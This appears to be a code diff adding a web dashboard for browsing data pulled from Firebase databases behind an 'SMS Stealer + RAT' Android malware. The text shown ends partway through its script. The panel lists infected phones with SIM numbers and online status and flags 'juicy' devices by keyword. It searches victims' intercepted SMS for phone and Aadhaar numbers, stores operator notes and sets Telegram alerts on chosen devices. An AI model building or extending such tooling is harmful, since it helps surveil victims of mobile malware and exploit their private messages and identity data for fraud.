@@ -1,0 +1,2355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Malware Analysis Dashboard - Firebase DBs</title>
+<style>
+  :root {
+    --bg: #0f1117; --bg2: #1a1d27; --bg3: #22263a;
+    --border: #2e3347; --accent: #5e72eb;
+    --green: #22c55e; --red: #ef4444; --yellow: #f59e0b; --gray: #64748b;
+    --text: #e2e8f0; --muted: #94a3b8;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; font-size: 14px; }
+
+  /* ── Header ── */
+  header { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 12px 20px;
+           display: flex; align-items: center; gap: 12px; position: sticky; top: 0; z-index: 100; }
+  header h1 { font-size: 18px; font-weight: 600; }
+  header .badge { background: var(--accent); color: #fff; border-radius: 12px; padding: 2px 10px; font-size: 12px; }
+  .search-bar { margin-left: auto; display: flex; gap: 8px; }
+  .search-bar input { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
+                      color: var(--text); padding: 6px 12px; width: 220px; outline: none; }
+  .search-bar input:focus { border-color: var(--accent); }
+  .btn { background: var(--accent); color: #fff; border: none; border-radius: 6px;
+         padding: 6px 14px; cursor: pointer; font-size: 13px; }
+  .btn:hover { opacity: .85; }
+  .btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--muted); }
+  .btn-ghost:hover { border-color: var(--accent); color: var(--text); }
+
+  /* ── Mode toggle ── */
+  .mode-toggle { display:flex; gap:6px; }
+  .mode-btn { background:var(--bg3); border:1px solid var(--border); border-radius:6px;
+              color:var(--muted); padding:5px 14px; cursor:pointer; font-size:13px; font-weight:600; }
+  .mode-btn.active { background:var(--accent); border-color:var(--accent); color:#fff; }
+  .mode-btn:hover:not(.active) { border-color:var(--accent); color:var(--text); }
+
+  /* ── Homepage selector ── */
+  #view-home { display:none; }
+  #view-home.active { display:flex; align-items:center; justify-content:center; min-height:70vh; }
+  .home-cards { display:flex; gap:24px; flex-wrap:wrap; justify-content:center; }
+  .home-card { background:var(--bg2); border:2px solid var(--border); border-radius:16px;
+               padding:36px 48px; cursor:pointer; text-align:center; transition:border-color .15s, transform .1s; min-width:220px; }
+  .home-card:hover { border-color:var(--accent); transform:translateY(-4px); }
+  .home-card .hc-icon { font-size:48px; margin-bottom:12px; }
+  .home-card .hc-title { font-size:20px; font-weight:700; margin-bottom:6px; }
+  .home-card .hc-sub { color:var(--muted); font-size:13px; }
+
+  /* ── Main layout ── */
+  main { padding: 16px 20px; }
+  #view-urls, #view-devices { display: none; }
+  #view-urls.active, #view-devices.active { display: block; }
+
+  /* ── Stats bar ── */
+  .stats-bar { display: flex; gap: 16px; margin-bottom: 16px; flex-wrap: wrap; }
+  .stat-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px;
+               padding: 10px 18px; min-width: 130px; }
+  .stat-card .label { color: var(--muted); font-size: 11px; text-transform: uppercase; letter-spacing: .05em; }
+  .stat-card .value { font-size: 22px; font-weight: 700; margin-top: 2px; }
+
+  /* ── URL grid ── */
+  .url-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(270px, 1fr)); gap: 12px; }
+  .url-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px;
+              padding: 14px 16px; cursor: pointer; transition: border-color .15s, transform .1s; }
+  .url-card:hover { border-color: var(--accent); transform: translateY(-2px); }
+  .url-card.has-juicy { border-color: var(--yellow); }
+  .url-card-header { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
+  .url-id { font-size: 18px; font-weight: 700; }
+  .url-host { color: var(--muted); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; flex: 1; }
+  .url-metrics { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
+  .metric { background: var(--bg3); border-radius: 6px; padding: 6px 10px; }
+  .metric .k { color: var(--muted); font-size: 10px; }
+  .metric .v { font-weight: 600; font-size: 13px; }
+  .tag-online { color: var(--green); }
+  .tag-offline { color: var(--red); }
+  .tag-juicy { display: inline-block; background: rgba(245,158,11,.15); color: var(--yellow);
+               border-radius: 4px; padding: 1px 6px; font-size: 11px; margin-top: 6px; }
+  .tag-no-data { color: var(--gray); font-style: italic; font-size: 12px; }
+  .sms-dates { font-size: 11px; color: var(--muted); margin-top: 6px; }
+
+  /* ── Devices view ── */
+  .back-btn { display: flex; align-items: center; gap: 6px; color: var(--muted); cursor: pointer;
+              margin-bottom: 14px; font-size: 13px; }
+  .back-btn:hover { color: var(--text); }
+  .url-detail-header { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px;
+                       padding: 14px 18px; margin-bottom: 16px; display: flex; flex-wrap: wrap; gap: 16px; align-items: center; }
+  .url-detail-header h2 { font-size: 16px; }
+  .detail-badges { display: flex; gap: 8px; flex-wrap: wrap; }
+  .badge-sm { border-radius: 6px; padding: 3px 10px; font-size: 12px; font-weight: 600; }
+  .badge-green { background: rgba(34,197,94,.15); color: var(--green); }
+  .badge-red   { background: rgba(239,68,68,.15);  color: var(--red); }
+  .badge-blue  { background: rgba(94,114,235,.15);  color: var(--accent); }
+  .badge-yellow{ background: rgba(245,158,11,.15);  color: var(--yellow); }
+
+  .device-filters { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
+  .filter-btn { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
+                color: var(--muted); padding: 5px 12px; cursor: pointer; font-size: 12px; }
+  .filter-btn.active { border-color: var(--accent); color: var(--text); }
+  .filter-btn:hover { border-color: var(--accent); }
+
+  /* ── Device table ── */
+  .device-table-wrap { overflow-x: auto; }
+  table { width: 100%; border-collapse: collapse; }
+  thead th { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 10px 12px;
+             text-align: left; font-size: 11px; color: var(--muted); text-transform: uppercase; white-space: nowrap; }
+  tbody tr { border-bottom: 1px solid var(--border); }
+  tbody tr:hover { background: var(--bg3); }
+  td { padding: 10px 12px; vertical-align: middle; }
+  .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
+  .dot-online { background: var(--green); box-shadow: 0 0 6px var(--green); }
+  .dot-offline { background: var(--gray); }
+  .sim-link { color: var(--accent); text-decoration: none; }
+  .sim-link:hover { text-decoration: underline; }
+  .kw-tag { display: inline-block; background: rgba(245,158,11,.12); color: var(--yellow);
+            border-radius: 3px; padding: 1px 5px; font-size: 10px; margin: 1px; }
+  .ids-tag { display: inline-block; background: rgba(94,114,235,.12); color: var(--accent);
+             border-radius: 3px; padding: 1px 5px; font-size: 10px; margin: 1px; }
+  .sms-btn { background: var(--bg3); border: 1px solid var(--border); border-radius: 4px;
+             color: var(--muted); padding: 3px 8px; font-size: 11px; text-decoration: none; white-space: nowrap; }
+  .sms-btn:hover { color: var(--text); border-color: var(--accent); }
+  .enriched-info { font-size: 11px; color: var(--muted); }
+  .enriched-info span { color: var(--text); }
+
+  .sim-edit-btn { background:none; border:none; color:var(--muted); cursor:pointer; font-size:11px;
+                  padding:1px 4px; border-radius:3px; margin-left:2px; }
+  .sim-edit-btn:hover { color:var(--yellow); }
+  .sim-edit-wrap { display:inline-flex; align-items:center; gap:3px; }
+  .sim-edit-input { background:var(--bg3); border:1px solid var(--accent); border-radius:4px;
+                    color:var(--text); padding:2px 6px; font-size:12px; width:120px; outline:none; }
+  .sim-save-btn { background:var(--accent); border:none; border-radius:4px; color:#fff;
+                  padding:2px 7px; font-size:11px; cursor:pointer; }
+  .sim-save-btn:hover { opacity:.85; }
+
+  /* ── Name inline edit ── */
+  .name-cell { min-width:90px; }
+  .name-display { cursor:pointer; color:var(--text); font-size:12px; }
+  .name-display.empty { color:var(--muted); font-style:italic; }
+  .name-display:hover { color:var(--accent); }
+  .name-edit-wrap { display:inline-flex; align-items:center; gap:3px; }
+  .name-edit-input { background:var(--bg3); border:1px solid var(--accent); border-radius:4px;
+                     color:var(--text); padding:2px 6px; font-size:12px; width:110px; outline:none; }
+
+  /* ── Keywords modal ── */
+  .kw-editor { width:100%; height:260px; background:var(--bg3); border:1px solid var(--border);
+               border-radius:6px; color:var(--text); padding:10px; font-size:13px;
+               font-family:monospace; resize:vertical; outline:none; }
+  .kw-editor:focus { border-color:var(--accent); }
+
+  /* ── SMS search results ── */
+  .sms-hit-card { background:var(--bg3); border:1px solid var(--border); border-radius:8px;
+                  padding:10px 14px; margin-bottom:8px; }
+  .sms-hit-meta { display:flex; gap:8px; align-items:center; margin-bottom:6px; flex-wrap:wrap; }
+  .sms-hit-device { font-size:11px; color:var(--accent); font-weight:600; }
+  .sms-hit-brand  { font-size:11px; color:var(--muted); }
+  .sms-hit-body   { font-size:12px; color:var(--text); line-height:1.5; word-break:break-word; }
+  .sms-hit-body mark { background:rgba(245,158,11,.3); color:var(--yellow); border-radius:2px; padding:0 2px; }
+
+  /* ── Loading / empty ── */
+  .loading { text-align: center; padding: 60px; color: var(--muted); }
+  .spinner { display: inline-block; width: 28px; height: 28px; border: 3px solid var(--border);
+             border-top-color: var(--accent); border-radius: 50%; animation: spin .7s linear infinite; margin-bottom: 10px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ── Modal ── */
+  .modal-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,.7); z-index:1000; overflow-y:auto; }
+  .modal-overlay.open { display:flex; align-items:flex-start; justify-content:center; padding:40px 16px; }
+  .modal-box { background:var(--bg2); border:1px solid var(--border); border-radius:12px; width:100%; max-width:760px; padding:20px; }
+  .modal-box h3 { font-size:15px; margin-bottom:12px; }
+  .modal-close { float:right; background:var(--bg3); border:1px solid var(--border); border-radius:6px; color:var(--muted); padding:4px 10px; cursor:pointer; }
+  .modal-close:hover { color:var(--text); }
+  .hit-card { background:var(--bg3); border:1px solid var(--border); border-radius:8px; padding:10px 14px; margin-bottom:10px; }
+  .hit-phones { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:6px; }
+  .phone-chip { background:rgba(94,114,235,.15); color:var(--accent); border-radius:4px; padding:2px 8px; font-size:12px; font-weight:600; }
+  .hit-body { font-size:12px; color:var(--muted); line-height:1.5; word-break:break-word; }
+
+  /* ── Progress overlay (blocks clicks during refresh all) ── */
+  .progress-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,.65); z-index:500;
+                      align-items:center; justify-content:center; flex-direction:column; gap:14px; }
+  .progress-overlay.active { display:flex; }
+  .progress-bar-wrap { width:320px; background:var(--bg3); border-radius:8px; height:10px; overflow:hidden; }
+  .progress-bar-fill { height:100%; background:var(--accent); border-radius:8px; transition:width .3s; }
+  .progress-label { color:var(--text); font-size:14px; }
+  @media (max-width: 600px) {
+    header { flex-wrap: wrap; } .search-bar { margin-left: 0; width: 100%; }
+    .search-bar input { flex: 1; }
+  }
+
+  /* ── Telegram Alert System ── */
+  .bell-btn {
+    background: none; border: none; cursor: pointer; font-size: 1rem;
+    padding: 2px 4px; margin-left: 4px; color: #9ca3af; opacity: 0.4;
+    transition: opacity 0.15s, color 0.15s; vertical-align: middle;
+  }
+  .bell-btn.active { color: #22c55e; opacity: 1; }  /* green when alert active */
+  .bell-btn:hover  { opacity: 0.85; }
+
+  /* ── Device ID copy + fire badge ── */
+  .devid-cell { display:inline-flex; align-items:center; gap:4px; cursor:pointer; }
+  .devid-cell code { font-size:11px; color:var(--muted); }
+  .devid-cell:hover code { color:var(--accent); }
+  .devid-copy-flash { font-size:10px; color:var(--green); display:none; }
+  .devid-copy-flash.show { display:inline; }
+  .fire-badge { font-size:13px; title:attr(title); }
+
+  /* ── Keyword filter picker ── */
+  .kw-filter-wrap { position:relative; display:inline-block; }
+  .kw-picker-dropdown {
+    position:absolute; top:calc(100% + 6px); left:0; min-width:240px; max-width:320px;
+    background:var(--bg2); border:1px solid var(--border); border-radius:10px;
+    padding:10px; z-index:500; box-shadow:0 6px 24px rgba(0,0,0,.5); display:none;
+  }
+  .kw-picker-dropdown.open { display:block; }
+  .kw-picker-header { display:flex; justify-content:space-between; align-items:center;
+                      margin-bottom:8px; font-size:12px; color:var(--muted); }
+  .kw-chip-grid { display:flex; flex-wrap:wrap; gap:5px; max-height:200px; overflow-y:auto; }
+  .kw-chip { background:var(--bg3); border:1px solid var(--border); border-radius:5px;
+             padding:3px 8px; font-size:11px; cursor:pointer; color:var(--muted);
+             transition:background .1s, color .1s; }
+  .kw-chip:hover { border-color:var(--accent); color:var(--text); }
+  .kw-chip.selected { background:rgba(94,114,235,.2); border-color:var(--accent);
+                      color:var(--accent); font-weight:600; }
+  .kw-picker-actions { display:flex; gap:6px; margin-top:8px; }
+  .filter-btn.kw-active { border-color:var(--accent); color:var(--text);
+                           background:rgba(94,114,235,.15); }
+
+  .bot-list-item {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 6px 0; border-bottom: 1px solid var(--border); gap: 8px;
+  }
+  .bot-list-item span { flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .trigger-group { display:flex; flex-direction:column; gap:6px; margin-top:4px; }
+  .trigger-group label { display:flex; align-items:center; gap:8px; cursor:pointer; }
+  .field-error { color:#ef4444; font-size:0.82rem; margin-top:3px; display:none; }
+  .field-error.visible { display:block; }
+
+  /* ── Notification bell ── */
+  .notif-btn { position:relative; background:none; border:none; cursor:pointer; font-size:1.2rem;
+               padding:4px 6px; color:var(--muted); }
+  .notif-btn:hover { color:var(--text); }
+  .notif-badge { position:absolute; top:0; right:0; background:var(--red); color:#fff;
+                 border-radius:50%; width:16px; height:16px; font-size:10px; font-weight:700;
+                 display:flex; align-items:center; justify-content:center; pointer-events:none; }
+  .notif-badge.hidden { display:none; }
+  .notif-dropdown { position:absolute; top:calc(100% + 8px); right:0; width:360px; max-height:460px;
+                    background:var(--bg2); border:1px solid var(--border); border-radius:10px;
+                    overflow-y:auto; z-index:2000; box-shadow:0 8px 30px rgba(0,0,0,.5); display:none; }
+  .notif-dropdown.open { display:block; }
+  .notif-header { display:flex; align-items:center; justify-content:space-between;
+                  padding:10px 14px; border-bottom:1px solid var(--border); }
+  .notif-header span { font-size:13px; font-weight:600; }
+  .notif-item { padding:10px 14px; border-bottom:1px solid var(--border); cursor:default; }
+  .notif-item:last-child { border-bottom:none; }
+  .notif-item:hover { background:var(--bg3); }
+  .notif-item .ni-top { display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; }
+  .notif-item .ni-type { font-size:11px; font-weight:600; }
+  .notif-item .ni-ts   { font-size:10px; color:var(--muted); }
+  .notif-item .ni-text { font-size:11px; color:var(--muted); white-space:pre-wrap; word-break:break-word; }
+  .notif-empty { text-align:center; padding:30px; color:var(--muted); font-size:13px; }
+
+  /* ── Home toast banner ── */
+  #notif-toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%);
+                 background:var(--bg2); border:1px solid var(--accent); border-radius:10px;
+                 padding:10px 20px; font-size:13px; color:var(--text); z-index:3000;
+                 box-shadow:0 4px 20px rgba(0,0,0,.5); display:none; max-width:480px;
+                 text-align:center; pointer-events:none; }
+  #notif-toast.show { display:block; animation:toastIn .25s ease; }
+  @keyframes toastIn { from { opacity:0; transform:translateX(-50%) translateY(12px); }
+                       to   { opacity:1; transform:translateX(-50%) translateY(0); } }
+</style>
+</head>
+<body>
+<header>
+  <h1 id="header-title" style="cursor:pointer" onclick="showHome()">📡 Device Monitor</h1>
+  <span class="badge" id="total-badge">—</span>
+  <div class="mode-toggle" id="mode-toggle" style="display:none">
+    <button class="mode-btn active" id="btn-malware" onclick="switchMode('new')">🔴 Malware DBs (4)</button>
+  </div>
+  <div class="search-bar">
+    <input type="text" id="search-input" placeholder="Search URL or Device ID…">
+    <!-- Notification bell -->
+    <div style="position:relative">
+      <button class="notif-btn" id="notif-bell-btn" onclick="toggleNotifDropdown()" title="Notifications">
+        🔔<span class="notif-badge hidden" id="notif-badge">0</span>
+      </button>
+      <div class="notif-dropdown" id="notif-dropdown">
+        <div class="notif-header">
+          <span>🔔 Alert History</span>
+          <button class="btn btn-ghost" style="font-size:11px;padding:2px 8px" onclick="clearNotifications()">Clear all</button>
+        </div>
+        <div id="notif-list"><div class="notif-empty">No alerts yet</div></div>
+      </div>
+    </div>
+    <button class="btn btn-ghost" id="refresh-btn" onclick="refreshUrlList()">↻ Refresh</button>
+  </div>
+</header>
+
+<main>
+  <!-- ── Homepage selector ── -->
+  <div id="view-home" class="active">
+    <div class="home-cards">
+      <div class="home-card" onclick="switchMode('new')" style="border-color: var(--red);">
+        <div class="hc-icon">🔴</div>
+        <div class="hc-title">Malware Databases</div>
+        <div class="hc-sub">4 active Firebase DBs<br>SMS Stealer + RAT</div>
+      </div>
+      <div class="home-card" onclick="openKeywordsModal()">
+        <div class="hc-icon">🔑</div>
+        <div class="hc-title">Edit Keywords</div>
+        <div class="hc-sub">Manage juicy keyword<br>detection list</div>
+      </div>
+      <div class="home-card" onclick="openAlertDevicesView()">
+        <div class="hc-icon">🔔</div>
+        <div class="hc-title">On Alert Devices</div>
+        <div class="hc-sub" id="alert-devices-home-sub">Loading…</div>
+      </div>
+      <div class="home-card" onclick="openFindAllView()">
+        <div class="hc-icon">🔍</div>
+        <div class="hc-title">Find All</div>
+        <div class="hc-sub">Search all devices<br>across all databases</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── FindAll view ── -->
+  <div id="view-findall" style="display:none;padding:0">
+    <div class="back-btn" onclick="showHome()" style="padding:16px 20px 8px">← Back to Home</div>
+    <div style="padding:0 20px 14px">
+      <h2 style="font-size:16px;margin-bottom:10px">🔍 Find All Devices</h2>
+      <div style="display:flex;gap:8px;align-items:center">
+        <input id="findall-input" type="text" placeholder="Enter keyword, SIM, brand or device ID…"
+               style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--text);padding:9px 14px;font-size:14px;outline:none"
+               onkeydown="if(event.key==='Enter')runFindAll(1)"
+               oninput="if(this.value.length===0)resetFindAll()">
+        <button class="btn" onclick="runFindAll(1)" id="findall-btn">Search</button>
+        <button class="btn btn-ghost" id="findall-dl-btn" onclick="downloadFindAllResults()" style="display:none" title="Download results as JSON">⬇️ Save</button>
+        <label class="btn btn-ghost" style="cursor:pointer;margin:0" title="Upload previously saved results">
+          ⬆️ Load<input type="file" id="findall-upload-input" accept=".json" style="display:none" onchange="uploadFindAllResults(event)">
+        </label>
+      </div>
+      <div id="findall-status" style="font-size:12px;color:var(--muted);margin-top:6px"></div>
+    </div>
+    <div id="findall-results" style="padding:0 20px"></div>
+    <div id="findall-pagination" style="padding:10px 20px 20px;display:flex;gap:8px;flex-wrap:wrap;align-items:center"></div>
+  </div>
+
+  <!-- ── URL list view ── -->
+  <div id="view-urls" class="active">    <div class="stats-bar" id="stats-bar"></div>
+    <div class="device-filters" id="sort-bar"></div>
+    <div class="url-grid" id="url-grid">
+      <div class="loading"><div class="spinner"></div><br>Loading…</div>
+    </div>
+  </div>
+
+  <!-- ── On Alert Devices view ── -->
+  <div id="view-alert-devices" style="display:none;padding:0">
+    <div class="back-btn" onclick="showHome()" style="padding:16px 20px 0">← Back to Home</div>
+    <div style="padding:12px 20px 0;display:flex;align-items:center;gap:10px">
+      <h2 style="font-size:16px">🔔 On Alert Devices</h2>
+      <button class="btn btn-ghost" onclick="openAlertDevicesView()" style="font-size:12px">↻ Refresh</button>
+    </div>
+    <div id="alert-devices-body" style="padding:12px 20px">
+      <div class="loading"><div class="spinner"></div><br>Loading…</div>
+    </div>
+  </div>
+
+  <!-- ── Devices view ── -->
+  <div id="view-devices">
+    <div class="back-btn" onclick="showUrls()">← Back to all URLs</div>
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">
+      <div class="url-detail-header" id="url-detail-header" style="flex:1;margin:0"></div>
+      <button class="btn btn-ghost" onclick="refreshCurrentUrl()" style="white-space:nowrap;flex-shrink:0">↻ Refresh</button>
+    </div>
+    <div class="device-filters" id="device-filters"></div>
+    <!-- ── Per-URL SMS Search ── -->
+    <div id="sms-search-bar" style="display:flex;gap:8px;margin-bottom:12px;align-items:center">
+      <input type="text" id="sms-search-input" placeholder="🔍 Search SMS across all devices in this URL…"
+             style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);padding:7px 12px;font-size:13px;outline:none"
+             onkeydown="if(event.key==='Enter')runSmsSearch()">
+      <button class="btn" onclick="runSmsSearch()" id="sms-search-btn">Search</button>
+      <button class="btn btn-ghost" onclick="clearSmsSearch()" id="sms-search-clear" style="display:none">✕ Clear</button>
+    </div>
+    <div id="sms-search-results" style="display:none"></div>
+    <div class="device-table-wrap" id="device-table-wrap">
+      <table id="device-table">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Name</th>
+            <th>Status</th>
+            <th>Brand</th>
+            <th>Device ID</th>
+            <th>Battery</th>
+            <th>SIM 1</th>
+            <th>SIM 2</th>
+            <th>Last Activity</th>
+            <th>Last Online</th>
+            <th>Juicy</th>
+            <th>Notes</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody id="device-tbody"></tbody>
+      </table>
+    </div>
+  </div>
+</main>
+
+<!-- ── Progress overlay (refresh all) ── -->
+<div class="progress-overlay" id="progress-overlay">
+  <div class="progress-label" id="progress-label">Refreshing URLs...</div>
+  <div class="progress-bar-wrap">
+    <div class="progress-bar-fill" id="progress-bar-fill" style="width:0%"></div>
+  </div>
+  <div style="color:var(--muted);font-size:12px" id="progress-sub"></div>
+</div>
+
+<!-- ── SearchNo Modal ── -->
+<div class="modal-overlay" id="searchno-modal" onclick="if(event.target===this)closeSearchno()">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeSearchno()">✕ Close</button>
+    <h3 id="searchno-title">📞 Phone Numbers in SMS</h3>
+    <div id="searchno-body"><div class="loading"><div class="spinner"></div><br>Fetching SMS…</div></div>
+  </div>
+</div>
+
+<!-- ── SearchAadhar Modal ── -->
+<div class="modal-overlay" id="searchaadhar-modal" onclick="if(event.target===this)closeSearchaadhar()">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeSearchaadhar()">✕ Close</button>
+    <h3 id="searchaadhar-title">🪪 Aadhaar Numbers in SMS</h3>
+    <div id="searchaadhar-body"><div class="loading"><div class="spinner"></div><br>Fetching SMS…</div></div>
+  </div>
+</div>
+
+<!-- ── Notes Modal ── -->
+<div class="modal-overlay" id="notes-modal" onclick="if(event.target===this)closeNotes()">
+  <div class="modal-box" style="max-width:520px">
+    <button class="modal-close" onclick="closeNotes()">✕ Close</button>
+    <h3 id="notes-title">📝 Device Notes</h3>
+    <textarea id="notes-textarea" style="width:100%;height:200px;margin-top:12px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);padding:10px;font-size:13px;resize:vertical" placeholder="Add notes about this device…"></textarea>
+    <div style="margin-top:10px;display:flex;gap:8px">
+      <button class="btn" onclick="saveNotes()">💾 Save</button>
+      <button class="btn btn-ghost" onclick="closeNotes()">Cancel</button>
+      <span id="notes-status" style="color:var(--green);font-size:12px;align-self:center"></span>
+    </div>
+  </div>
+</div>
+
+<!-- ── Device search results (global) ── -->
+<div id="device-search-results" style="display:none;padding:16px 20px">
+  <div style="color:var(--muted);font-size:13px;margin-bottom:12px" id="device-search-info"></div>
+  <div id="device-search-grid"></div>
+</div>
+
+<!-- ── Keywords Modal ── -->
+<div class="modal-overlay" id="keywords-modal" onclick="if(event.target===this)closeKeywordsModal()">
+  <div class="modal-box" style="max-width:560px">
+    <button class="modal-close" onclick="closeKeywordsModal()">✕ Close</button>
+    <h3>🔑 Juicy Keywords</h3>
+    <p style="color:var(--muted);font-size:12px;margin:8px 0 10px">One keyword per line. Case-insensitive. Changes apply to next poll cycle.</p>
+    <textarea class="kw-editor" id="kw-textarea" spellcheck="false" placeholder="Loading…"></textarea>
+    <div style="margin-top:10px;display:flex;gap:8px;align-items:center">
+      <button class="btn" onclick="saveKeywords()">💾 Save</button>
+      <button class="btn btn-ghost" onclick="closeKeywordsModal()">Cancel</button>
+      <span id="kw-count" style="color:var(--muted);font-size:12px;margin-left:auto"></span>
+      <span id="kw-status" style="color:var(--green);font-size:12px"></span>
+    </div>
+  </div>
+</div>
+
+<script>
+let allUrls = [];
+let currentDevices = [];
+let currentUrlId = 0;
+let activeFilter = 'all';
+let currentSort = 'total';
+let currentMode = 'new'; // 'new' | 'old' | 'pp' | 'srk'
+let currentDeviceNames = {}; // { deviceId: name }
+
+// ── Mode switching ────────────────────────────────────────────────────────────
+function apiPrefix() {
+  if (currentMode === 'old') return '/api/old';
+  if (currentMode === 'pp')  return '/api/pp';
+  if (currentMode === 'srk') return '/api/srk';
+  return '/api';
+}
+
+function switchMode(mode) {
+  currentMode = mode;
+  document.getElementById('btn-malware').classList.toggle('active', mode === 'new');
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-urls').classList.add('active');
+  document.getElementById('mode-toggle').style.display = '';
+  document.getElementById('total-badge').textContent = '—';
+  allUrls = [];
+  loadUrls();
+}
+
+function showHome() {
+  document.getElementById('view-home').classList.add('active');
+  document.getElementById('view-urls').classList.remove('active');
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-alert-devices').style.display = 'none';
+  document.getElementById('view-findall').style.display = 'none';
+  document.getElementById('mode-toggle').style.display = 'none';
+  document.getElementById('total-badge').textContent = '—';
+  // Refresh alert devices count on home
+  _refreshAlertDevicesCount();
+}
+
+// ── Sort helpers ──────────────────────────────────────────────────────────────
+function sortUrls(urls, sortKey) {
+  const arr = [...urls];
+  if (sortKey === 'total') {
+    arr.sort((a, b) => b.total - a.total);
+  } else if (sortKey === 'juicy') {
+    arr.sort((a, b) => b.juicyCount - a.juicyCount);
+  } else if (sortKey === 'oldest') {
+    arr.sort((a, b) => {
+      if (!a.oldestSms && !b.oldestSms) return 0;
+      if (!a.oldestSms) return 1;
+      if (!b.oldestSms) return -1;
+      return a.oldestSms < b.oldestSms ? -1 : a.oldestSms > b.oldestSms ? 1 : 0;
+    });
+  } else if (sortKey === 'newest') {
+    arr.sort((a, b) => {
+      if (!a.newestSms && !b.newestSms) return 0;
+      if (!a.newestSms) return 1;
+      if (!b.newestSms) return -1;
+      return a.newestSms > b.newestSms ? -1 : a.newestSms < b.newestSms ? 1 : 0;
+    });
+  }
+  return arr;
+}
+
+function setSort(key, btn) {
+  currentSort = key;
+  document.querySelectorAll('.sort-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderUrls(allUrls);
+}
+
+// ── Load URL list ─────────────────────────────────────────────────────────────
+const REMOVED_IDS = new Set([3,4,6,7,31,38,47, 42,43,44,57,89]);
+
+async function loadUrls() {
+  document.getElementById('url-grid').innerHTML = '<div class="loading"><div class="spinner"></div><br>Loading…</div>';
+  const res = await fetch(`${apiPrefix()}/urls`);
+  const raw = await res.json();
+  allUrls = currentMode === 'new' ? raw.filter(u => !REMOVED_IDS.has(u.id)) : raw;
+  renderUrls(allUrls);
+  renderStats(allUrls);
+}
+
+// ── Refresh All: fetch live status for every URL one by one ───────────────────
+async function refreshAll() {
+  const overlay  = document.getElementById('progress-overlay');
+  const bar      = document.getElementById('progress-bar-fill');
+  const label    = document.getElementById('progress-label');
+  const sub      = document.getElementById('progress-sub');
+  const total    = allUrls.length || 1;
+
+  overlay.classList.add('active');
+  let done = 0;
+
+  for (const u of allUrls) {
+    label.textContent = `Refreshing ${done + 1} / ${total} — URL #${u.id}`;
+    sub.textContent   = u.url.replace('https://','').replace('-default-rtdb.firebaseio.com','');
+    bar.style.width   = `${Math.round(done / total * 100)}%`;
+    try {
+      const r = await fetch(`/api/url/${u.id}/live`);
+      const d = await r.json();
+      // Update allUrls entry with fresh online count
+      const idx = allUrls.findIndex(x => x.id === u.id);
+      if (idx >= 0 && d.total != null) {
+        allUrls[idx].online = d.online;
+      }
+    } catch {}
+    done++;
+  }
+
+  bar.style.width   = '100%';
+  label.textContent = `Done — ${total} URLs refreshed`;
+  sub.textContent   = '';
+  setTimeout(() => {
+    overlay.classList.remove('active');
+    loadUrls();  // reload full summary
+  }, 800);
+}
+
+function renderStats(urls) {
+  const total   = urls.length;
+  const hasData = urls.filter(u => u.total > 0).length;
+  const devices = urls.reduce((s, u) => s + u.total, 0);
+  const online  = urls.reduce((s, u) => s + u.online, 0);
+  const juicy   = urls.reduce((s, u) => s + u.juicyCount, 0);
+
+  document.getElementById('total-badge').textContent = `${total} URLs`;
+  document.getElementById('stats-bar').innerHTML = `
+    <div class="stat-card"><div class="label">URLs with data</div><div class="value">${hasData}</div></div>
+    <div class="stat-card"><div class="label">Total devices</div><div class="value">${devices.toLocaleString()}</div></div>
+    <div class="stat-card"><div class="label">Online now</div><div class="value tag-online">${online}</div></div>
+    <div class="stat-card"><div class="label">Juicy devices</div><div class="value" style="color:var(--yellow)">${juicy}</div></div>
+  `;
+}
+
+function renderUrls(urls) {
+  const q = document.getElementById('search-input').value.toLowerCase();
+  let filtered = q ? urls.filter(u => String(u.id).includes(q) || u.url.toLowerCase().includes(q)) : urls;
+  filtered = sortUrls(filtered, currentSort);
+
+  // Render sort bar
+  const sortBar = document.getElementById('sort-bar');
+  if (sortBar) {
+    sortBar.innerHTML = `
+      <button class="filter-btn sort-btn ${currentSort==='total'?'active':''}" onclick="setSort('total',this)">📊 Most Devices</button>
+      <button class="filter-btn sort-btn ${currentSort==='juicy'?'active':''}" onclick="setSort('juicy',this)">🎯 Most Juicy</button>
+      <button class="filter-btn sort-btn ${currentSort==='oldest'?'active':''}" onclick="setSort('oldest',this)">🕐 Oldest SMS</button>
